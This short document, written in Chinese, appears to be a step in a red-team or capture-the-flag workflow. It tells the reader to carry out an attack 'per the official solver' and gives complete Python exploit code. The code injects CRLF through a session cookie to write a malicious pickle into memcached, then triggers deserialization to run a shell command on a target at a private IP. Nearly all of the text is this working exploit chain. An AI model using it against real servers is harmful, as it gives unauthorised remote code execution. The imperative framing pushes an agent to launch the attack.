下一步必须执行攻击步骤。参考官方solver: 构造包含CRLF的session cookie，注入memcached命令存储恶意pickle payload，然后触发反序列化RCE。示例代码：python
from redteam_sdk import HttpClient
s = HttpClient('http://172.29.80.1:9084')
# 构造cookie payload
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("echo pwned > /tmp/pwn",))
payload = pickle.dumps(RCE(), 0)
payload_size = len(payload)
cookie = b"1\r\nset injected 0 5 " + str.encode(str(payload_size)) + b"\r\n" + payload + b"\r\nget injected"
# 转义为八进制
pack = ""
for x in cookie:
    if x > 64:
        pack += oct(x).replace("0o", "\\")
    elif x < 8:
        pack += oct(x).replace("0o", "\\00")
    else:
        pack += oct(x).replace("0o", "\\0")
malicious_cookie = '"' + pack + '"'
# 设置session cookie
resp = s.get('/', cookies={"session": malicious_cookie})
print(resp.text)
